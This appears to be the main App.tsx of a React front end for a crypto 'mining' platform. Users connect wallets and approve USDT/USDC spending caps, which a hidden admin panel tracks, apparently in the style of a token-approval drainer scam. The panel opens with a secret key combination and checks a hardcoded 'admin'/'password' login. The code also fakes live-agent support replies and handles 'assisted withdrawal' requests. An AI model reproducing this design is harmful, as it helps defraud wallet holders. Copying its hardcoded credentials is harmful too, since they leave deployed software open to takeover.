import React, { useState, useEffect, useCallback } from 'react';
import type { Page, AdminUser, ChatSession, Message, AdminTransaction, WithdrawalRequest, SiteSettings } from './types';
import AdminLayout from './components/admin/AdminLayout';
import FrontendApp from './components/FrontendApp';
import ConnectWalletModal from './components/ConnectWalletModal';
import AdminLoginModal from './components/admin/AdminLoginModal';
import EngagementModal from './components/EngagementModal';
import CustomerServiceModal from './components/CustomerServiceModal';
import LiveChat from './components/LiveChat';
import RequestAssistanceModal from './components/RequestAssistanceModal';
import * as api from './components/admin/api';

// Helper function to generate random alphanumeric strings for new user data
const generateAlphanumeric = (length: number) => [...Array(length)].map(() => Math.random().toString(36)[2]).join('');
const NEW_USER_BONUS = 0.05;

function App() {
  // === STATE MANAGEMENT ===
  const [currentPage, setCurrentPage] = useState<Page>('landing');
  const [isConnected, setIsConnected] = useState(false);
  const [connectedWalletAddress, setConnectedWalletAddress] = useState<string | null>(null);
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
  const [isAdminView, setIsAdminView] = useState(false);
  
  // Modals
  const [showConnectModal, setShowConnectModal] = useState(false);
  const [showAdminLoginModal, setShowAdminLoginModal] = useState(false);
  const [showWelcomeModal, setShowWelcomeModal] = useState(false);
  const [showCustomerServiceModal, setShowCustomerServiceModal] = useState(false);
  const [showRequestAssistanceModal, setShowRequestAssistanceModal] = useState(false);
  const [showLiveChat, setShowLiveChat] = useState(false);
  const [referrer, setReferrer] = useState<string | null>(null);

  // User Data (for frontend simulation)
  const [userWalletBalance, setUserWalletBalance] = useState({ usdt: 50000, usdc: 25000 });
  
  // New State for Token Allowances
  const [usdtAllowance, setUsdtAllowance] = useState(0);
  const [usdcAllowance, setUsdcAllowance] = useState(0);

  // --- Centralized Data Store ---
  const [isLoading, setIsLoading] = useState(true);
  const [users, setUsers] = useState<AdminUser[]>([]);
  const [transactions, setTransactions] = useState<AdminTransaction[]>([]);
  const [withdrawals, setWithdrawals] = useState<WithdrawalRequest[]>([]);
  const [chatSessions, setChatSessions] = useState<Record<string, ChatSession>>({});
  const [siteSettings, setSiteSettings] = useState<SiteSettings | null>(null);
  
  // === DATA FETCHING & HANDLERS ===
  const loadInitialData = useCallback(async () => {
      try {
          setIsLoading(true);
          const [initialUsers, initialSessions, initialTransactions, initialWithdrawals, settings] = await Promise.all([
              api.publicFetchUsers(),
              api.getChatSessions(),
              api.publicFetchTransactions(),
              api.publicFetchWithdrawals(),
              api.publicFetchSiteSettings()
          ]);
          setUsers(initialUsers);
          setChatSessions(initialSessions);
          setTransactions(initialTransactions);
          setWithdrawals(initialWithdrawals);
          setSiteSettings(settings);
      } catch (error) {
          console.error("Could not load initial data.", error);
      } finally {
          setIsLoading(false);
      }
  }, []);

  // Derive user-specific data for the profile page
  const currentUser = users.find(u => u.walletAddress.toLowerCase() === connectedWalletAddress?.toLowerCase());
  const userReferrals = users.filter(u => u.invitationParent === connectedWalletAddress);
  const userChatSession = connectedWalletAddress ? chatSessions[connectedWalletAddress] : undefined;

  const handleNavigate = (page: Page) => {
    setCurrentPage(page);
  };

  // Connection
  const handleConnectClick = () => {
    setShowWelcomeModal(false);
    setReferrer(null);
    setShowConnectModal(true);
  };
  
  const handleConnectSuccess = async (address: string) => {
    setIsConnected(true);
    setConnectedWalletAddress(address);
    setShowConnectModal(false);
    setCurrentPage('mining');

    const isNewUser = !users.some(u => u.walletAddress.toLowerCase() === address.toLowerCase());
    let initialEthBalance = 0;

    if (isNewUser || referrer) {
       initialEthBalance = NEW_USER_BONUS;
    }

    if (isNewUser) {
        const parentUser = referrer ? users.find(u => u.referralCode === referrer) : null;
        
        const newUser: AdminUser = {
            id: `usr_${generateAlphanumeric(4)}`,
            walletAddress: address,
            walletName: 'MetaMask', // Default assumption
            referralCode: generateAlphanumeric(6).toUpperCase(),
            usdtDepositAddress: 'T' + generateAlphanumeric(33),
            usdcDepositAddress: 'T' + generateAlphanumeric(33),
            ipAddress: '203.0.113.100', // Mocked
            location: 'Unknown', // Mocked
            joinDate: new Date().toISOString().split('T')[0],
            lastActive: new Date().toISOString(),
            status: 'Active',
            ethBalance: initialEthBalance, // New users start with the bonus
            walletBalance: { usdt: 0, usdc: 0 },
            usdtAllowance: 0,
            usdcAllowance: 0,
            totalDeposits: 0,
            invitationParent: parentUser ? parentUser.walletAddress : null,
            referrals: 0
        };
        
        const updatedUsers = await api.addUser(newUser, parentUser ? parentUser.id : null);
        setUsers(updatedUsers);
    }
    
    sessionStorage.setItem('hasConnectedBefore', 'true');
  };

  const handleDisconnect = () => {
    setIsConnected(false);
    setConnectedWalletAddress(null);
    setCurrentPage('landing');
    setUsdtAllowance(0); // Reset allowance on disconnect
    setUsdcAllowance(0);
  };

  // Admin
  const handleAdminLoginAttempt = (user: string, pass: string): boolean => {
    if (user === 'admin' && pass === 'password') {
      setIsAdminAuthenticated(true);
      setShowAdminLoginModal(false);
      setIsAdminView(true);
      return true;
    }
    return false;
  };
  const handleLogout = () => {
    setIsAdminAuthenticated(false);
    setIsAdminView(false);
  };
  const handleEnterAdminView = () => setIsAdminView(true);
  const handleExitAdminView = () => setIsAdminView(false);

  // Customer Service Handlers
  const handleCustomerServiceClick = () => {
    setShowCustomerServiceModal(true);
  };

  // Live Chat Handlers
  const handleStartLiveChat = async () => {
      setShowCustomerServiceModal(false);
      if (!connectedWalletAddress) return;
      
      const updatedSessions = await api.startOrGetChatSession(connectedWalletAddress);
      setChatSessions(updatedSessions);
      setShowLiveChat(true);
  };

  const handleUserSendMessage = async (text: string) => {
      if (!connectedWalletAddress) return;
      const newMessage: Message = { text, sender: 'user', timestamp: new Date().toISOString() };
      
      const sessionsAfterUserMsg = await api.addChatMessage(connectedWalletAddress, newMessage);
      setChatSessions(sessionsAfterUserMsg);

      // Simulate admin auto-reply
      setTimeout(async () => {
          if (!connectedWalletAddress) return; // check again in case user disconnected
          const autoReply: Message = { text: "Thank you for your message. An agent is reviewing your query and will respond shortly.", sender: 'admin', timestamp: new Date().toISOString() };
          const sessionsAfterAdminMsg = await api.addChatMessage(connectedWalletAddress, autoReply);
          setChatSessions(sessionsAfterAdminMsg);
      }, 2000);
  };

  const handleAdminSendMessage = useCallback(async (sessionId: string, text: string) => {
       const newMessage: Message = { text, sender: 'admin', timestamp: new Date().toISOString() };
       const updatedSessions = await api.addChatMessage(sessionId, newMessage);
       setChatSessions(updatedSessions);
  }, []);

  const handleAdminReadMessage = useCallback(async (sessionId: string) => {
      const updatedSessions = await api.markChatReadByAdmin(sessionId);
      setChatSessions(updatedSessions);
  }, []);
  
  // Admin Data Handlers
  const handleUpdateUserStatus = useCallback(async (userId: string, status: AdminUser['status']) => {
    try {
      await api.updateUserStatus(userId, status);
      const updatedUsers = await api.publicFetchUsers(); // Re-fetch to ensure sync
      setUsers(updatedUsers);
    } catch (error) {
      alert("Failed to update user status.");
      console.error(error);
    }
  }, []);
  
  const handleUpdateWithdrawalStatus = useCallback(async (withdrawalId: string, status: WithdrawalRequest['status']) => {
    try {
      await api.updateWithdrawalStatus(withdrawalId, status);
      const updatedWithdrawals = await api.publicFetchWithdrawals(); // Re-fetch
      setWithdrawals(updatedWithdrawals);
    } catch (error) {
      alert("Failed to update withdrawal status.");
      console.error(error);
    }
  }, []);


  // Mining & Transfers (for frontend simulation)
  const handleStartMining = async (amount: number, from: 'USDT' | 'USDC', eth: number) => {
    if (!currentUser) return;
    
    // 1. Update local frontend simulation state for instant UI feedback
    const newWalletBalance = { ...userWalletBalance, [from.toLowerCase()]: userWalletBalance[from.toLowerCase() as 'usdt' | 'usdc'] - amount };
    setUserWalletBalance(newWalletBalance);

    let newUsdtAllowance = usdtAllowance, newUsdcAllowance = usdcAllowance;
    if (from === 'USDT') {
        newUsdtAllowance -= amount;
        setUsdtAllowance(newUsdtAllowance);
    } else {
        newUsdcAllowance -= amount;
        setUsdcAllowance(newUsdcAllowance);
    }

    // 2. Calculate the new ETH balance for the user
    const newPlatformEthBalance = (currentUser.ethBalance || 0) + eth;

    // 3. Update the central user record via API to synchronize with admin panel
    const updatedUsers = await api.updateUserBalanceAndAllowance(
        currentUser.walletAddress,
        newPlatformEthBalance,
        newWalletBalance, // Also persist the simulated wallet balance for consistency
        { usdt: newUsdtAllowance, usdc: newUsdcAllowance }
    );
    setUsers(updatedUsers); // Set the entire user list state with the updated data
  };
  
  const handleSetAllowance = async (amount: number, currency: 'USDT' | 'USDC') => {
      if (!currentUser) return;
      alert(`You have approved a spending cap of ${amount.toLocaleString()} ${currency}.\nYou can now proceed with one-click conversions up to this amount.`);
      
      let newUsdtAllowance = usdtAllowance, newUsdcAllowance = usdcAllowance;
      if (currency === 'USDT') {
          newUsdtAllowance = amount;
          setUsdtAllowance(newUsdtAllowance);
      } else {
          newUsdcAllowance = amount;
          setUsdcAllowance(newUsdcAllowance);
      }
      
      const updatedUsers = await api.updateUserBalanceAndAllowance(
          currentUser.walletAddress,
          currentUser.ethBalance,
          userWalletBalance, 
          { usdt: newUsdtAllowance, usdc: newUsdcAllowance }
      );
      setUsers(updatedUsers);
  };

  const handleTransfer = async (amount: number) => {
    if (!currentUser || amount > currentUser.ethBalance) {
      alert('Insufficient balance for transfer.');
      return;
    }
    
    const newPlatformEthBalance = currentUser.ethBalance - amount;

    const updatedUsers = await api.updateUserBalanceAndAllowance(
        currentUser.walletAddress,
        newPlatformEthBalance,
        currentUser.walletBalance,
        { usdt: currentUser.usdtAllowance, usdc: currentUser.usdcAllowance }
    );
    setUsers(updatedUsers);

    alert(`Successfully transferred ${amount} ETH to your wallet.`);
  };

  const handleRequestAssistedWithdrawal = async (amount: number, message: string) => {
    if (!connectedWalletAddress) return;
    try {
        await api.requestAssistedWithdrawal(connectedWalletAddress, amount, message);
        const updatedWithdrawals = await api.publicFetchWithdrawals(); // Re-fetch
        setWithdrawals(updatedWithdrawals);
        setShowRequestAssistanceModal(false);
        alert('Your request for an assisted withdrawal has been sent to support.');
    } catch (error) {
        alert('Failed to send request. Please try again.');
    }
  };


  useEffect(() => {
    // On initial load, populate all state from the mock API
    loadInitialData();

    // Secret key combination to open admin login
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.shiftKey && e.key === 'A') {
        setShowAdminLoginModal(true);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    
    // Check for referral link
    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref');
    if (ref) {
        setReferrer(ref);
    }

    // Show welcome modal on first visit of the session
    const hasVisited = sessionStorage.getItem('hasVisited');
    if (!hasVisited) {
        setShowWelcomeModal(true);
        sessionStorage.setItem('hasVisited', 'true');
    }

    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [loadInitialData]);

  if (isAdminAuthenticated && isAdminView) {
    return (
      <AdminLayout
        onExitAdmin={handleExitAdminView}
        onLogout={handleLogout}
        users={users}
        transactions={transactions}
        withdrawals={withdrawals}
        chatSessions={chatSessions}
        siteSettings={siteSettings}
        onAdminSendMessage={handleAdminSendMessage}
        onAdminReadMessage={handleAdminReadMessage}
        onUpdateUserStatus={handleUpdateUserStatus}
        onUpdateWithdrawalStatus={handleUpdateWithdrawalStatus}
        onRefreshData={loadInitialData}
      />
    );
  }

  return (
    <>
      <FrontendApp 
        currentPage={currentPage}
        isConnected={isConnected}
        isAdminAuthenticated={isAdminAuthenticated}
        connectedWalletAddress={connectedWalletAddress}
        userWalletBalance={userWalletBalance}
        platformEthBalance={currentUser?.ethBalance || 0}
        userReferrals={userReferrals}
        usdtAllowance={usdtAllowance}
        usdcAllowance={usdcAllowance}
        referralCode={currentUser?.referralCode}
        onNavigate={handleNavigate}
        onConnectClick={handleConnectClick}
        onDisconnect={handleDisconnect}
        onLogout={handleLogout}
        onEnterAdminView={handleEnterAdminView}
        onStartMining={handleStartMining}
        onSetAllowance={handleSetAllowance}
        onTransfer={handleTransfer}
        onCustomerServiceClick={handleCustomerServiceClick}
        onRequestAssistedWithdrawal={() => setShowRequestAssistanceModal(true)}
      />
      {showConnectModal && (
        <ConnectWalletModal
          onClose={() => setShowConnectModal(false)}
          onConnectSuccess={handleConnectSuccess}
        />
      )}
      {showAdminLoginModal && !isAdminAuthenticated && (
        <AdminLoginModal
          onClose={() => setShowAdminLoginModal(false)}
          onLoginAttempt={handleAdminLoginAttempt}
        />
      )}
      {(showWelcomeModal || referrer) && !isConnected && (
        <EngagementModal
          onClose={() => {
            setShowWelcomeModal(false)
            setReferrer(null)
          }}
          onConnect={handleConnectClick}
          referrer={referrer}
        />
      )}
      {showCustomerServiceModal && (
        <CustomerServiceModal
          onClose={() => setShowCustomerServiceModal(false)}
          onLiveChatClick={handleStartLiveChat}
          telegramUrl={siteSettings?.supportTelegramUrl || ''}
        />
      )}
      {showLiveChat && isConnected && (
        <LiveChat 
            onClose={() => setShowLiveChat(false)}
            messages={userChatSession?.messages || []}
            onSendMessage={handleUserSendMessage}
        />
      )}
      {showRequestAssistanceModal && (
        <RequestAssistanceModal
            onClose={() => setShowRequestAssistanceModal(false)}
            onSubmit={handleRequestAssistedWithdrawal}
            currentBalance={currentUser?.ethBalance || 0}
        />
      )}
    </>
  );
}

export default App;